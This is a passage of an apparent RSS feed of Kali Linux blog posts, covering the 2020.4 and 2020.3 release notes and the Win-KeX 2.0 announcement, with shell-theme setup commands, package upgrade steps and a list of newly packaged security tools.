/etc/skel/.zshrc ~/ kali@kali:~$ kali@kali:~$ chsh -s /bin/zsh kali@kali:~$ kali@kali:~$ zsh </code></pre> <p><em>If you&rsquo;re reading this, you may also be the type of person who likes Easter eggs - our prompts contain a few! If you go looking you may find a few gems (e.g. <code>new_line_before_prompt</code> &amp; root vs non-root).</em>_</p> <h2 id="bash-shell-makeover">Bash Shell Makeover</h2> <p>Kali Linux now has a universal, cross-shell theme.</p> <p>Whilst we were tweaking ZSH, we also updated our Bash prompt (<code>$PS1</code>), to make it feel similar <em>(but not act similar)</em> to our ZSH prompt. We started playing with the Bash prompt in <a href="https://www.kali.org/blog/kali-linux-2020-3-release/">Kali Linux 2020.3</a>, when the colors changed for non-root users, from red to blue. Before then, we had not changed it since Kali Linux was <a href="https://www.kali.org/blog/kali-linux-1-0-0-release/">first released</a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-4-release/images/bash.png'> <img src="https://www.kali.org/blog/kali-linux-2020-4-release/images/bash.png" alt="" /> </a> </p> </p> <p><strong>How do I get it?</strong> Another good question! Very similar answer to ZSH, but this time using <code>.bashrc</code> instead. If you are doing:</p> <ul> <li>A fresh installation of Kali Linux 2020.4 or later, it&rsquo;s already applied.</li> <li>If you are <a href="https://www.kali.org/docs/general-use/updating-kali/">updating Kali</a>, you will need to configure each user (e.g. non-root &amp; root/)</li> </ul> <p>If you have made any alterations to <code>~/.bashrc</code>, make sure to back it up before replacing it:</p> <pre><code class="language-console">kali@kali:~$ cp -i .bashrc{,.bak} kali@kali:~$ kali@kali:~$ cp -i /etc/skel/.bashrc ~/ kali@kali:~$ kali@kali:~$ source ~/.bashrc +--(kali?kali)-[~] +-$ echo &quot;Hello World. I'm $0&quot; Hello World. I'm bash +--(kali?kali)-[~] +-$ </code></pre> <p><em>If you look &amp; edit the contents of <code>.bashrc</code>, you can switch to the red &ldquo;<a href="https://www.backtrack-linux.org/">BackTrack</a>&rdquo; prompt to be nostalgic.</em></p> <h2 id="partnership-with-tools-authors-byt3bl33d3rs-crackmapexec-cme">Partnership with tools authors: byt3bl33d3r&rsquo;s CrackMapExec (CME)</h2> <p>Kali Linux is part of the greater community and we want to support tool authors where possible. If you have not heard of <a href="https://pkg.kali.org/pkg/crackmapexec">CrackMapExec (a.k.a CME)</a>, you may be missing a trick <em>(or three)</em> when it comes to doing infrastructure assessments (especially involving Active Directory).</p> <p>We noticed that <a href="https://twitter.com/byt3bl33d3r/status/1275611300194705409">byt3bl33d3r</a> made the decision to move to a sponsorware model. You may or may not agree with his decision, but we understand <a href="https://porchetta.industries/2020/11/17/And-Now-For-Something-Completely-Diffrent/">his reasoning</a>. The tools which he makes are highly valuable and relied upon by many. We want to support him and our Kali Linux users. After various calls and email exchanges, we are delighted to reveal <strong>Kali has partnered with byt3bl33d3r</strong>.</p> <p><strong>What does this mean for me?</strong> The Kali package of CME is now pulling from a private source, allowing Kali Linux users to get access to the newest changes in CME <strong>30 days</strong> before the tool is made public to everyone else. If you don&rsquo;t use Kali, you either need to <a href="https://github.com/sponsors/byt3bl33d3r">sponsor directly</a> or wait for it to be released after 30 days.</p> <p><strong>Why are you doing this?</strong> Because we believe in Open-source and the community as a whole. This way, everyone benefits; both authors and users.</p> <p><strong>Kali is Open-source. What is stopping me from stealing/ripping/cloning from you?</strong> The code will be distributed with a banner saying something along the lines of, &ldquo;for Kali users only&rdquo;. Removing/altering the code will break the software license thus breaking copyright law. Do not be that guy.</p> <p><strong>Is that it?</strong> Yes! <a href="https://www.kali.org/docs/policy/kali-linux-open-source-policy/">Kali Linux is Open-source</a>. We understand and respect software licenses, and by doing so we hope to keep everything Open-source as much as possible. Putting checks &amp; protection in place, you may be happy using someone else&rsquo;s cracked/pirated software (warez) - but do you know <a href="https://blog.cobaltstrike.com/2013/09/05/how-to-crack-cobalt-strike-and-backdoor-it/">what has been altered under the hood</a>?</p> <p>But Kali Linux being Open-source, has to respect other people license agreements, as do any other respectable organizations. This also includes when tools which have their license agreements changed in <a href="https://github.com/volatilityfoundation/volatility3/issues/208">software updates</a>, as a result, we have removed them from Kali.</p> <p>We have more to announce about direction step in a 2021.x release <em>(as well as looking for other authors to sponsor with)</em>. Stay tuned for more information!</p> <h2 id="message-at-login">Message At Login</h2> <p>We have noticed there being a large uprise of the amount of people saying &ldquo;Kali Linux is missing &lsquo;XYZ&rsquo;&rdquo; or &ldquo;XYZ feature is broken&rdquo;, when this is not always the case. We have done our best to write up various issues on <a href="https://www.kali.org/docs/">our docs pages</a>, however it appears they are not always being read. We also know that not everyone has a unix beard as long as <a href="https://www.kali.org/about-us/">@elwood-offsec</a>, but hope you still are an <a href="https://www.kali.org/docs/introduction/should-i-use-kali-linux/">experienced Linux user</a>. There is always a reason why something is the way it is, but it may require more than the usual basic troubleshooting.</p> <p>With all of that said, we are wanting to improve our communications going forwards. Most of the actions in Kali are done by the command line. So now, upon logging into a Kali terminal or console, you may be presented with a mixture of the following <em>(depending on the configuration of your system, as it is dynamic)</em>:</p> <pre><code class="language-console">$ ssh kali@172.16.13.37 Last login: Thu Nov 12 15:12:29 2020 from 172.16.13.1 ??(Message from Kali developers) ? ? This is a minimal installation of Kali Linux, you likely ? want to install supplementary tools. Learn how: ? ? https://www.kali.org/docs/troubleshooting/common-minimum-setup/ ? ? This is a cloud installation of Kali Linux. Learn more about ? the specificities of the various cloud images: ? ? https://www.kali.org/docs/troubleshooting/common-cloud-setup/ ? ? We have kept /usr/bin/python pointing to Python 2 for backwards ? compatibility. Learn how to change this and avoid this message: ? ? https://www.kali.org/docs/general-use/python3-transition/ ? ??(Run &quot;touch ~/.hushlogin&quot; +--(kali?kali)-[~] +-$ </code></pre> <p>We hope this helps various common problems to be quickly fixed, but at the same time, not feel intrusive. Each of the issues have a link to our documentation page in order to correct the issue. After its been addressed, the message should not be displayed again. For whatever reason (unable or do not want to), you can permanently hide any messages from us being displayed by doing: <code>touch ~/.hushlogin</code> (per user) or <code>touch /etc/kali-motd/disable-all</code> (for a global setting).</p> <p>We have a few other things in the works to help communicate items out planned for 2021.x. Stay tuned!</p> <h2 id="aws-ec2-cloud-image-refresh">AWS EC2 Cloud Image Refresh</h2> <p>Kali Linux has been on <a href="https://www.kali.org/docs/cloud/aws/">AWS</a> since <a href="https://www.kali.org/blog/kali-linux-1-0-6-release/">1.0.6</a>. Over the years, we have done various refreshes of our <a href="https://gitlab.com/kalilinux/build-scripts">build-scripts</a> to produce the <a href="https://gitlab.com/kalilinux/build-scripts/kali-cloud">cloud images</a>. Finally with Kali 2020.2, we have a fully automated system in place. However during the changeover, we were shipping the image without any GUI or any tools by default. This was to give the cleanest, smallest image as possible. In hindsight, we didn&rsquo;t communicate this change over well, and a lot of you noticed &ldquo;tools missing&rdquo; (as <code>kali-linux-default</code> was not included/). However, in 2020.4, we have created a new metapackage, <code>kali-linux-headless</code>, and included it which only has the default set of command line tools.</p> <p>Upon doing the refresh, we have worked with AWS to get Kali Linux added to &ldquo;<a href="https://twitter.com/kalilinux/status/1321453286067707904">GovCloud</a>&rdquo;. Which may be useful to a certain audience. With how the accounts were setup, we have had to start from fresh. <strong>As a result, we have a <a href="https://aws.amazon.com/marketplace/pp/B08LL91KKB">new marketplace entry</a></strong>.</p> <p>What does this mean for people who are using the old entry? As Kali Linux is a rolling distribution, not a lot! You can still keep <a href="https://www.kali.org/docs/general-use/updating-kali/">updating Kali Linux</a> as usual. However, you will no longer be able to spin up the latest version using the latest instance. For that, you will need to switch to the new entry.</p> <p>Note: We have tried to say it as many different places as possible, but putting it here is not going to hurt. The default login for <strong>AWS EC2 username is &ldquo;kali&rdquo;</strong> (not the standard &ldquo;ec2-user&rdquo;).</p> <h2 id="kali-docs--packaging-guides">Kali-Docs &amp; Packaging Guides</h2> <p>In <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">2019.4</a>, we moved <code>https://docs.kali.org/</code> from a WordPress solution to <code>https://www.kali.org/docs/</code> using Hugo. In September, we finished <em>(for now)</em> tweaking the theme, making it easier to use, super fast at loading and easier to <strong>anyone</strong> to edit.</p> <p>We have started to go though all the pages and refreshing them, bringing them all up-to-date, and adding more in. We are doing it section by section, and so far have completed the first three (so we still have a way to go! After it is completed, it will be easier to keep them up-to-date, making it an on-going task. For the sections that are missing or lacking content, we have been generating <a href="https://gitlab.com/kalilinux/documentation/kali-docs/-/boards/1429718">issues to help track</a>. If you want to help get <a href="https://www.kali.org/docs/community/contribute/">involved with Kali Linux</a>, this is an easy place to start.</p> <p>We have also created various new pages, all about our packaging process:</p> <ul> <li><a href="https://www.kali.org/docs/development/setting-up-packaging-system/">Setting Up A System For Packaging</a></li> <li><a href="https://www.kali.org/docs/development/intro-to-packaging-example/">Introduction to Packaging (Instaloader)</a></li> <li><a href="https://www.kali.org/docs/development/intermediate-packaging-example/">Intermediate Packaging (Photon)</a></li> <li><a href="https://www.kali.org/docs/development/advanced-packaging-example/">Advanced Packaging (FinalRecon &amp; Python-icmplib)</a></li> </ul> <p>We have also the pages from our login messages:</p> <ul> <li><a href="https://www.kali.org/docs/troubleshooting/common-cloud-setup/">Common Cloud Based Setup Information</a></li> <li><a href="https://www.kali.org/docs/general-use/python3-transition/">Everything you need to know about the switch to Python 3</a></li> <li><a href="https://www.kali.org/docs/troubleshooting/common-minimum-setup/">Minimum Install Setup Information</a></li> </ul> <p>And various other pages created:</p> <ul> <li><a href="https://www.kali.org/docs/cloud/aws/">AWS</a></li> <li><a href="https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/">Kali inside VirtualBox (Guest VM)</a></li> <li><a href="https://www.kali.org/docs/general-use/using-eol-python-versions/">Using EoL Python Versions on Kali</a></li> <li><a href="https://www.kali.org/docs/wsl/win-kex/">Win-KeX v2</a></li> <li><a href="https://www.kali.org/docs/wsl/win-kex-sl/">Win-KeX SL</a></li> <li><a href="https://www.kali.org/docs/wsl/win-kex-win/">Win-KeX Win</a></li> </ul> <h2 id="new-tools--updates">New Tools &amp; Updates</h2> <p>As with every Kali release, there are new tools and updates. The <a href="https://pkg.kali.org/pkg/linux">kernel</a> got an upgrade to 5.9, so you benefit with all the loveliness that that brings. We have switched to &ldquo;<a href="https://pkg.kali.org/pkg/proxychains-ng">proxychains4</a>&rdquo; (aka <a href="https://github.com/rofl0r/proxychains-ng">ProxyChains-NG</a>) as the default (everything from v3 should still work: same flags and configuration files &amp; folder locations for legacy users, else the paths will reflect the version if starting from fresh). Also, <a href="https://pkg.kali.org/pkg/meta-gnome3">GNOME</a> was updated to 3.38 &amp; <a href="https://pkg.kali.org/pkg/meta-kde">KDE</a> to 5.19.</p> <p>New tools in Kali Linux:</p> <ul> <li><a href="https://pkg.kali.org/pkg/apple-bleee">Apple bleee</a></li> <li><a href="https://pkg.kali.org/pkg/certgraph">CertGraph</a></li> <li><a href="https://pkg.kali.org/pkg/dnscat2">dnscat2</a></li> <li><a href="https://pkg.kali.org/pkg/finalrecon">FinalRecon</a></li> <li><a href="https://pkg.kali.org/pkg/godoh">goDoH</a></li> <li><a href="https://pkg.kali.org/pkg/hostapd-mana">hostapd-mana</a></li> <li><a href="https://pkg.kali.org/pkg/metasploit-framework">Metasploit Framework v6</a></li> <li><a href="https://pkg.kali.org/pkg/whatmask">Whatmask</a></li> </ul> <p>One last thing. We have tweaked how we handle our wallpaper packages:</p> <ul> <li><code>kali-wallpapers-all</code> ~ Give me all the wallpapers</li> <li><code>kali-wallpapers-2019.4</code> ~ Default for Kali Linux between 2019.4 and 2020.3</li> <li><code>kali-wallpapers-2020.4</code> ~ Default for Kali Linux between 2020.4 and onwards</li> <li><code>kali-wallpapers-legacy</code> ~ Nostalgic value</li> </ul> <h2 id="kali-nethunter">Kali NetHunter</h2> <p>@yesimxev has added a new settings menu, allowing for easy back up and restore of configuration files. It also allows you to change the Kali NetHunter boot animation. How is this as a teaser?</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-4-release/images/boot-kali.gif'> <img src="https://www.kali.org/blog/kali-linux-2020-4-release/images/boot-kali.gif" alt="" /> </a> </p> </p> <p>Call on all boot animation devs out there: We&rsquo;d love to hear from you. If you have a cool boot animation you&rsquo;d like to share, please submit a merge request to our <a href="https://gitlab.com/kalilinux/nethunter/apps/kali-nethunter-bootanimation">Kali NetHunter boot animation repository</a>.</p> <p>The new images also contain a &ldquo;Magisk persistence&rdquo; module, so we no longer have to flash Magisk again after we installed Kali NetHunter.</p> <h2 id="win-kex-25">Win-KeX 2.5</h2> <p>Win-KeX 2.5 includes a new &ldquo;<a href="https://www.kali.org/docs/virtualization/install-hyper-v-guest-enhanced-session-mode/">Enhanced Session Mode</a> (&ndash;esm)&rdquo;, which works like the &ldquo;Window&rdquo; mode but uses the Remote Deskop Protocol (RDP/) &amp; client native to Windows. This mode will allow users of &ldquo;Windows on ARM&rdquo; devices to use Win-KeX and it adds sharpness to Win-KeX on HiDPI devices.</p> <p>We have also added a <code>--ip</code> option to address a bug in WoA causing massive packet losses when using &ldquo;localhost&rdquo;. To start Win-KeX with sound on arm devices, just type:</p> <pre><code class="language-console">kali@kali:~$ kex --esm --ip --sound kali@kali:~$ </code></pre> <p>The <code>--ip</code> parameter has one little downside though: Win-KeX asks for the Kali Linux user password when launched for the first time and stores it in the Windows credentials store. Since the IP address changes after every reboot, you will be prompted again. This is a known WSL2 bug and we&rsquo;ll expect it to be fixed soon so that we can drop the <code>--ip</code> parameter and we&rsquo;ll never have to enter the password again.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-4-release/images/surface-kex.png'> <img src="https://www.kali.org/blog/kali-linux-2020-4-release/images/surface-kex.png" alt="Win-KeX 2.5 on a Surface Pro X" /> </a> </p> </p> <h2 id="kali-vagrant--vmware">Kali Vagrant &amp; VMware</h2> <p>We have had a Vagrant image since <a href="https://www.kali.org/blog/kali-linux-2018-3-release/">Kali Linux 2018.3</a>. However, it&rsquo;s always been for VirtualBox. Until now. We are now also producing a VMware <a href="https://app.vagrantup.com/kalilinux/boxes/rolling">Vagrant image</a>!</p> <p>Note, you will need to have a separate license for both VMware and <a href="https://www.vagrantup.com/vmware">Vagrant</a> for this to work, as it is a paid-for plugin. For more information, you can see <a href="https://www.vagrantup.com/docs/providers/vmware/usage">here</a> and <a href="https://www.vagrantup.com/docs/providers/basic_usage">here</a>.</p> <h2 id="kali-arm-devices">Kali ARM devices</h2> <p>We have been working away on our <a href="https://www.offsec.com/kali-linux-arm-images/">ARM images</a> as usual, and this release is no exception. We have reduced the amount of pre-generated images (now 14) as there has not been the demand for these other devices. We have left their <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">build scripts</a> (now up to 43 devices supported), in case you wish to generate the images yourself.</p> <h2 id="community-shoutouts">Community Shoutouts</h2> <p>Following on from last time, these are people from the public who have helped Kali and the team for the last release. We are super grateful and want to praise them for their work (giving credit where due!):</p> <ul> <li>@1y for generating a ARM build script for a new device, <code>imx6-ull-evk</code></li> <li><a href="https://gitlab.com/dracode">@dracode</a> for the awesome work on NetHunter, in particular the GPS fixes.</li> <li><a href="https://gitlab.com/Mirivan">@mirivan</a> for all the amazing additions and fixes to NetHunter as well as helping out with the issue tracker.</li> <li><a href="https://gitlab.com/TheMMcOfficial">@TheMMcOfficial</a> for his continued help with NetHunter and DuckHunter</li> <li><a href="https://gitlab.com/Martinvlba">@Martinvlba</a> for his great contributions to NetHunter, especially hostapd</li> <li><a href="https://gitlab.com/s133py">@s133py</a> for all the tireless work on NetHunter and helping with issues</li> </ul> <p>Not a community member per se, but we do want to give an honorable mention to <a href="https://gitlab.com/">GitLab</a>. Kali Linux is now a <a href="https://about.gitlab.com/solutions/open-source/partners/">Open-Source Partner</a> <em>(different to their <a href="https://about.gitlab.com/solutions/open-source/">Open-Source Program</a>)</em>. We made the switch <a href="https://www.kali.org/blog/kali-linux-roadmap-2019-2020/">middle of 2019</a>, and we could not have been happier. Thank you GitLab for supporting <a href="https://gitlab.com/kalilinux">us</a>, and for everything you do for the Open-source communities as a whole!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-4-release/images/gitlab.png'> <img src="https://www.kali.org/blog/kali-linux-2020-4-release/images/gitlab.png" alt="" /> </a> </p> </p> <p>And on the subject, <a href="https://hub.docker.com/u/kalilinux">Kali Linux</a> is apart of <a href="https://www.docker.com/blog/expanded-support-for-open-source-software-projects/">Docker&rsquo;s Open-source Community</a>.</p> <hr> <h2 id="download-kali-linux-20204">Download Kali Linux 2020.4</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">downloading</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages when you download the image, you can just use the weekly image instead. This way you&rsquo;ll have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard release images</em>. But we gladly take bug reports about those images because we want any issues to be fixed before our next release.</p> <p><strong>Existing Upgrades</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>, followed by setting the default shell to ZSH. If you&rsquo;re already using ZSH, and want our new configuration, you can do the following:</p> <pre><code class="language-console">kali@kali:~$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list kali@kali:~$ kali@kali:~$ sudo apt update &amp;&amp; sudo apt -y full-upgrade kali@kali:~$ kali@kali:~$ cp -i /etc/skel/.bashrc ~/ kali@kali:~$ kali@kali:~$ cp -i /etc/skel/.zshrc ~/ kali@kali:~$ kali@kali:~$ chsh -s /bin/zsh kali@kali:~$ kali@kali:~$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f kali@kali:~$ </code></pre> <p>You should now be on Kali Linux 2020.4. We can do a quick check by doing:</p> <pre><code class="language-console">kali@kali:~$ grep VERSION /etc/os-release VERSION=&quot;2020.4&quot; VERSION_ID=&quot;2020.4&quot; VERSION_CODENAME=&quot;kali-rolling&quot; kali@kali:~$ kali@kali:~$ uname -v #1 SMP Debian 5.9.1-1kali2 (2020-10-29) kali@kali:~$ kali@kali:~$ uname -r 5.9.0-kali1-amd64 kali@kali:~$ </code></pre> <p>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. <em>We&rsquo;ll never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p></description>
</item>
<item>
<title>Win-KeX Version 2.0</title>
<link>https://www.kali.org/blog/win-kex-version-2-0/</link>
<guid isPermaLink="true">https://www.kali.org/blog/win-kex-version-2-0/</guid>
<pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/win-kex-version-2-0/images/win-kex-2-2.jpg" type="image/jpg"/>
<description><p>We have been humbled by the amazing response to our recent launch of <a href="https://www.kali.org/blog/kali-linux-2020-3-release/">Win-KeX</a>. After its initial release, we asked ourselves if that is truly the limit of what we can achieve or could we pull off something incredible to mark the 25th anniversary of Hackers? What about &ldquo;a second concurrent session as root&rdquo;, &ldquo;seamless desktop integration with Windows&rdquo;, or - dare we dream - &ldquo;sound&rdquo;?</p> <p>With no further further ado, we are thrilled to present to you <strong>Win-KeX v2.0</strong> with the following features:</p> <ul> <li><strong>Win-KeX SL (Seamless Edition)</strong> - bye bye borders</li> <li><strong>Sound support</strong></li> <li><strong>Multi-session support</strong></li> <li><strong>KeX sessions can be run as root</strong></li> <li><strong>Able to launch &ldquo;kex&rdquo; from anywhere</strong> - no more cd-ing into the Kali filesystem required</li> <li><strong>Shared clipboard</strong> - cut and paste content between Kali and Windows apps</li> </ul> <p><p> <a href='https://www.kali.org/blog/win-kex-version-2-0/images/win-kex-2.0.png'> <img src="https://www.kali.org/blog/win-kex-version-2-0/images/win-kex-2.0.png" alt="" /> </a> </p> </p> <p><a href="https://www.kali.org/blog/win-kex-version-2-0/#the-installation-of-win-kex-is-as-easy-as-always"></a>The installation of Win-KeX is as easy as always:</p> <p><code>sudo apt upgrade &amp;&amp; sudo apt install -y kali-win-kex</code> (in a <a href="https://www.kali.org/docs/wsl/win-kex/">Kali WSL installation</a>/)</p> <p><a href="https://www.kali.org/blog/win-kex-version-2-0/#win-kex-now-supports-two-dedicated-modes"></a>Win-KeX now supports two dedicated modes:</p> <ol> <li>Win-KeX Window mode is the classic Win-KeX look and feel with one dedicated window for the Kali Linux desktop. To launch Win-KeX in Window mode with sound support, type: <code>kex --win -s</code></li> <li>Win-KeX SL mode provides a seamless integration of Kali Linux into the Windows desktop with the Windows Start menu at the bottom and the Kali panel at the top of the screen. All applications are launched in their own windows sharing the same desktop as Windows applications. <code>kex --sl --s</code></li> </ol> <h6 id="to-enable-sound">To enable sound:</h6> <p>Start Win-KeX with the <code>--sound</code> or <code>-s</code> command line parameter. We&rsquo;ve been watching Blu-rays in Win-KeX SL without problems. Why you ask? Because - now we can ;-)</p> <h6 id="win-kex-now-supports-concurrent-sessions">Win-KeX now supports concurrent sessions</h6> <ul> <li>Win-KeX as unprivileged user</li> <li>Win-KeX as root user</li> <li>Win-KeX SL</li> </ul> <h6 id="windows-firewall">Windows Firewall</h6> <p>Both SL mode and sound support require access through the Windows Defender firewall. When prompted, tick &ldquo;Public networks&rdquo;. You can later go to the firewall settings and restrict the scope to the WSL network (usually <code>172.3x.xxx.0/20</code>)</p> <h6 id="manpage">Manpage</h6> <p>Forgotten that lifesaving parameter? Try:</p> <pre><code class="language-sh">kex --help </code></pre> <p>for a quick overview, or consult the manual page for a detailed manual:</p> <pre><code class="language-sh">man kex </code></pre> <p><p> <a href='https://www.kali.org/blog/win-kex-version-2-0/images/win-kex2.0-manpage.png'> <img src="https://www.kali.org/blog/win-kex-version-2-0/images/win-kex2.0-manpage.png" alt="" /> </a> </p> </p> <h6 id="big-shout-out-to-the-authors-of-the-following-components-without-which-there-would-be-no-win-kex">Big shout-out to the authors of the following components without which there would be no Win-KeX:</h6> <ul> <li>Win-KeX Win is brought to you by <a href="https://tigervnc.org/">TigerVNC</a></li> <li>Win-KeX SL utilizes <a href="https://sourceforge.net/projects/vcxsrv/">VcXsr Windows X Server</a></li> <li>Sound support is achieved through the integration of <a href="https://www.freedesktop.org/wiki/Software/PulseAudio/">PulseAudio</a>.</li> </ul> <h3 id="further-information">Further Information:</h3> <p>More information can be found on our <a href="https://www.kali.org/docs/wsl/win-kex/">documentation site</a>.</p> <p>We hope you enjoy Win-KeX as much as we do and we&rsquo;d love to see you around in the <a href="https://forums.kali.org/">Kali Forums</a></p></description>
</item>
<item>
<title>Kali Linux 2020.3 Release (ZSH, Win-Kex, HiDPI & Bluetooth Arsenal)</title>
<link>https://www.kali.org/blog/kali-linux-2020-3-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2020-3-release/</guid>
<pubDate>Tue, 18 Aug 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2020-3-release/images/kali-2020-3-release-v2.jpg" type="image/jpg"/>
<description><p>Its that <a href="https://www.kali.org/releases/">time of year</a> again, time for another Kali Linux release! <strong>Quarter #3 - Kali Linux 2020.3</strong>. This release has various impressive updates, all of which are ready for immediate <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">updating</a>.</p> <p>A quick overview of what&rsquo;s new since the last release in <a href="https://www.kali.org/blog/kali-linux-2020-2-release/">May 2020</a>:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-3-release/#new-shell-is-coming">New Shell</a></strong> - <em>Starting the process to switch from &ldquo;Bash&rdquo; to &ldquo;<strong>ZSH</strong>&rdquo;</em></li> <li>The release of <strong><a href="https://www.kali.org/blog/kali-linux-2020-3-release/#win-kex">Win-Kex</a></strong> - <em>Get ready <strong>WSL2</strong></em></li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-3-release/#automating-hidpi">Automating HiDPI</a></strong> support - <em>Easy switching mode</em></li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-3-release/#tool-icons">Tool Icons</a></strong> - <em>Every default tool now has its own unique icon</em></li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-3-release/#kali-nethunter-bluetooth-arsenal">Bluetooth Arsenal</a></strong> - <em>New set of tools for Kali NetHunter</em></li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-3-release/#kali-nethunter-for-nokia-phones">Nokia Support</a></strong> - <em>New devices for Kali NetHunter</em></li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2020-3-release/#setup-process">Setup Process</a></strong> - <em>No more <strong>missing network repositories</strong> and <strong>quicker installs</strong></em></li> </ul> <h2 id="new-shell-is-coming">New Shell (Is Coming)</h2> <p>Most people who use Kali Linux, <em>(<a href="https://www.kali.org/docs/introduction/should-i-use-kali-linux/">we hope</a>)</em>, are very experienced Linux users. As a result, they feel very comfortable around the command line. We understand that &ldquo;shells&rdquo; are a very personal and precious thing to everyone (local or remote!), as that is how most people interact with Kali Linux. To the point where lots of experienced users only use a &ldquo;GUI&rdquo; to spin up multiple terminals. By default, Kali Linux has always used &ldquo;bash&rdquo; <em>(aka &ldquo;Bourne-Again SHell&rdquo;)</em> as the default shell, when you open up a terminal or console. Any seasoned Kali user would know the prompt <code>kali@kali:~$</code> <em>(or <code>root@kali:~#</code> for the older users!/)</em> very well!</p> <p>Today, we are announcing the plan to switch over to <strong>ZSH shell</strong>. This is currently scheduled to be the <strong>default shell in 2020.4</strong> <em>(for this <strong>2020.3 release, bash will still be the default</strong>)</em>.</p> <p>If you have a <strong>fresh default install</strong> of Kali Linux 2020.3, you should have ZSH already installed <em>(if not, do <code>sudo apt install -y zsh zsh-syntax-highlighting zsh-autosuggestions</code>)</em>, ready for a try. However if you installed an earlier version of Kali Linux and have <strong>upgraded to 2020.3</strong>, your user will be lacking the default ZSH configuration that we cooked with lots of love. So for upgrade users only, make sure to copy the configuration file:</p> <pre><code class="language-console">kali@kali:~$ cp /etc/skel/.zshrc ~/ kali@kali:~$ </code></pre> <p>Then all you need to do is switch to ZSH:</p> <pre><code class="language-console">kali@kali:~$ zsh +--(kali?kali)-[~] +-$ </code></pre> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-zsh.png'> <img src="https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-zsh.png" alt="" /> </a> </p> </p> <p>If you like what you see, you can <strong>set ZSH as your default</strong> <em>(replacing bash)</em> by doing <code>chsh -s /bin/zsh</code>. <em>Which is what we will be doing in 2020.4</em>.</p> <p>We wanted to give the community a notice before this switch happens. This is a very large change (some may argue larger than the <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">Gnome to Xfce switch last year</a>). <strong>We are also looking for <a href="https://bugs.kali.org/main_page.php">feedback</a></strong>. We hope we have the right balance of design and functionality, but we know these typically don&rsquo;t get done perfect the first time. And, we don&rsquo;t want to overload the default shell with too many features, as lower powered devices will then struggle or it may be hard to on the eyes to read. ZSH has been something we have wanted to do for a long time <em>(even before the switch over to <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">Xfce</a>!)</em>.</p> <p>We will be doing extensive testing during this next cycle so we reserve the right to delay the default change, or change direction all together. Again, we encourage you to provide <a href="https://bugs.kali.org/main_page.php">feedback</a> on this process. There is no way we can cover every use case on our own, so <strong>your help is important</strong>.</p> <hr> <p><strong>Q.) Why did you make the switch? What&rsquo;s wrong with bash?</strong> A.) You can do a lot of advanced things with bash, and customize it to do even more, but ZSH allows you to do even more. This was one really large selling point.</p> <p><strong>Q.) Why did you pick ZSH and not fish?</strong> A.) In the discussion of switching shells, one of the options that came up is Fish <em>(Friendly Interactive SHell)</em>. Fish is a nice shell <em>(probably nicer than ZSH)</em>, but realistically it was not a real consideration due to the fact that it is not POSIX compatible. This would cause a lot of issues, as common one-liners just won&rsquo;t work.</p> <p><strong>Q.) Are you going to use any ZSH frameworks (e.g. Oh-My-ZSH or Prezto)?</strong> A.) At this point in time, by default, no. The weight of these would not be workable for lower powered devices. You can still install them yourself afterwards <em>(as many of our team do)</em>.</p> <h2 id="win-kex">Win-KeX</h2> <p>Having Kali Linux on &ldquo;Windows Subsystem for Linux&rdquo; (WSL) is something <a href="https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/">we have been taking advantage of</a> since it came out. With the release of <a href="https://www.kali.org/blog/wsl2-and-kali/">WSLv2</a>, the overall functionality and user experience improved dramatically.</p> <p>Today, the experience is improving once more with the introduction of <strong>Win-KeX</strong> (Windows + Kali Desktop EXperience). After installing it, typing in <code>kex</code>, or clicking on the button, Win-KeX will give you a <strong>persistent-session GUI</strong>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-win-kex.png'> <img src="https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-win-kex.png" alt="" /> </a> </p> </p> <p>After getting WSL installed <em>(there&rsquo;s countless guides online, or you can follow <a href="https://www.kali.org/docs/wsl/win-kex/">ours</a>/)</em>, you can install <code>Win-KeX</code> by doing the following:</p> <pre><code class="language-sh">sudo apt update &amp;&amp; sudo apt install -y kali-win-kex </code></pre> <p>Afterwards, if you want to make a shortcut, follow our <a href="https://www.kali.org/docs/wsl/win-kex/">guide</a>, or you can just type in <code>kex</code>!</p> <p>On the subject of <strong>WSL</strong> (and this is true for 